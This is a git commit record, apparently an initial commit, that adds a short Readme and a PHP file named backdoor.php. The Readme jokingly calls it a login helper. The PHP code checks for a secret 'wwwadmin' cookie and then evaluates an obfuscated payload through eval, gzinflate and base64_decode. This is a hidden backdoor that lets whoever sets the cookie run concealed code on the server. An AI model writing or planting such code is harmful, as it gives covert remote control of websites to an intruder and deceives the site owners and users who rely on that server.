fc508ea739c3b9737a62c9178006e4ec0aaf264d
plopz0r <alain@schaufelwat.ch>
2018-03-18 15:39:18 +0100

    Initial commit

---
+++ Readme.md
@@ -0,0 +1,1 @@
+Some people might call this a backdoor, I just call it "helpful login mechanism for when I forget my password".
---
+++ backdoor.php
@@ -0,0 +1,7 @@
+<?php
+if(isset($_COOKIE['wwwadmin'])) {
+        $code="y0zTSK/KzEvLSSxJ1UhKLE41M4lPSU3OT0nVUIl39vf39nSNVi8vL09Myc3MU4/V1FSwtbVVUCo2Ti4yLolPSkzOTjEwKIovyY9PzMmJL0hMTy1WVNJUqObiVIkPdg0O9vT3i1bPTFGPVbBVMLRGEYUaCZGoBQA=";
+        eval(gzinflate(base64_decode($code)));
+}
+
+?>
